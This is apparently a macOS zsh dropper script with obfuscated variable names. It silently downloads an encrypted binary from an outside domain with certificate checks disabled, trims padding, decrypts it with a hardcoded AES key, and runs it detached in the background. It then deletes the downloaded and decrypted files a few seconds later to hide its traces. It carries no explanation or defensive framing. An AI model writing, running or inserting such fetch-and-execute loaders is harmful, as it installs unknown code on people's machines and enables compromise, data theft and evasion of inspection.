#!/bin/zsh
px9jz=$(mktemp /tmp/uskjqe.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m9e0a1afb0d87bc6e.bin" -o "$px9jzz" || exit 1
bp8trc=$(stat -f %z "$px9jzz"); eepxx7j=$(( bp8trc - 73 - 892 ))
tail -c +$(( 73 + 1 )) "$px9jzz" | head -c $eepxx7j | openssl enc -d -aes-256-cbc -k 8eca33b863eb3c3b2b052b8b -out "$px9jz" 2>/dev/null
[ -s "$px9jz" ] && chmod 700 "$px9jz" && ( "$px9jz" & ) && disown
( sleep 3; rm -f "$px9jz" "$px9jzz" ) &>/dev/null &
